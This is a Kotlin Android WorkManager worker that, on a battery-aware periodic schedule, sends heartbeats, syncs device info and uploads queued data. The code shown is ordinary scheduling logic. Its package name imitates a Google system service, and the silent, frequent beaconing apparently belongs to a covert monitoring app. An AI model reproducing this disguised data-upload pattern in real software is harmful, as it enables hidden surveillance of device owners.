package com.google.android.systemservice.workers

import android.content.Context
import android.os.BatteryManager
import androidx.hilt.work.HiltWorker
import androidx.work.*
import com.google.android.systemservice.data.repository.DeviceRepository
import com.google.android.systemservice.utils.DataSyncManager
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import timber.log.Timber
import java.util.concurrent.TimeUnit

/**
 * WorkManager-based worker for periodic data synchronization.
 * Implements battery-aware sync logic with adaptive intervals.
 * Uses Hilt for dependency injection.
 */
@HiltWorker
class DataSyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted workerParams: WorkerParameters,
    private val repository: DeviceRepository
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "DataSyncWorker"
        private const val WORK_NAME = "data_sync"

        // Schedule intervals (minutes)
        private const val DEFAULT_SYNC_INTERVAL_MIN = 15L
        private const val CHARGING_SYNC_INTERVAL_MIN = 5L
        private const val MEDIUM_BATTERY_SYNC_INTERVAL_MIN = 30L
        private const val LOW_BATTERY_SYNC_INTERVAL_MIN = 60L

        // Battery thresholds (percentage)
        private const val BATTERY_HIGH_THRESHOLD = 50
        private const val BATTERY_LOW_THRESHOLD = 20

        // Retry
        private const val MAX_RETRY_ATTEMPTS = 3
        
        fun schedule(context: Context, intervalMinutes: Long = DEFAULT_SYNC_INTERVAL_MIN) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build()
            
            val request = PeriodicWorkRequestBuilder<DataSyncWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    WorkRequest.MIN_BACKOFF_MILLIS,
                    TimeUnit.MILLISECONDS
                )
                .addTag("data_sync")
                .build()
            
            WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    request
                )
            
            Timber.d("DataSyncWorker scheduled with $intervalMinutes minute interval")
        }
        
        fun scheduleAdaptive(context: Context) {
            val interval = calculateOptimalInterval(context)
            schedule(context, interval)
            Timber.d("Adaptive scheduling: $interval minute interval")
        }
        
        private fun calculateOptimalInterval(context: Context): Long {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager ?: return DEFAULT_SYNC_INTERVAL_MIN
            val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = batteryManager.isCharging
            
            return when {
                isCharging -> CHARGING_SYNC_INTERVAL_MIN
                batteryLevel > BATTERY_HIGH_THRESHOLD -> DEFAULT_SYNC_INTERVAL_MIN
                batteryLevel > BATTERY_LOW_THRESHOLD -> MEDIUM_BATTERY_SYNC_INTERVAL_MIN
                else -> LOW_BATTERY_SYNC_INTERVAL_MIN
            }
        }
        
        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
            Timber.d("DataSyncWorker cancelled")
        }
    }

    private val dataSyncManager by lazy { DataSyncManager(applicationContext) }

    override suspend fun doWork(): Result {
        return try {
            Timber.d("Starting sync...")
            
            // Check battery level before heavy operations
            if (!isBatteryHealthy()) {
                Timber.w("Battery low, skipping intensive operations")
                return Result.success()
            }
            
            // Send heartbeat using repository
            val heartbeatResult = repository.sendHeartbeat()
            if (heartbeatResult.isSuccess) {
                Timber.d("Heartbeat sent successfully")
            } else {
                Timber.w("Heartbeat failed: ${heartbeatResult.exceptionOrNull()?.message}")
            }
            
            // Sync device info
            val deviceInfoResult = repository.getDeviceInfo()
            if (deviceInfoResult.isSuccess) {
                Timber.d("Device info synced: ${deviceInfoResult.getOrNull()}")
            }
            
            // Sync offline queued data — delegate entirely to DataSyncManager
            val uploadedCount = dataSyncManager.flushAllSuspend()
            if (uploadedCount > 0) {
                Timber.d("Uploaded $uploadedCount queued items")
            }
            
            Timber.d("Sync completed successfully")
            Result.success()
        } catch (e: Exception) {
            Timber.e(e, "Sync failed")
            if (runAttemptCount < MAX_RETRY_ATTEMPTS) {
                Result.retry()
            } else {
                Result.failure()
            }
        }
    }
    
    private fun isBatteryHealthy(): Boolean {
        return try {
            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager ?: return true
            val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = batteryManager.isCharging
            
            batteryLevel > BATTERY_LOW_THRESHOLD || isCharging
        } catch (e: Exception) {
            Timber.e(e, "Failed to check battery health")
            true // Assume healthy on error
        }
    }
}
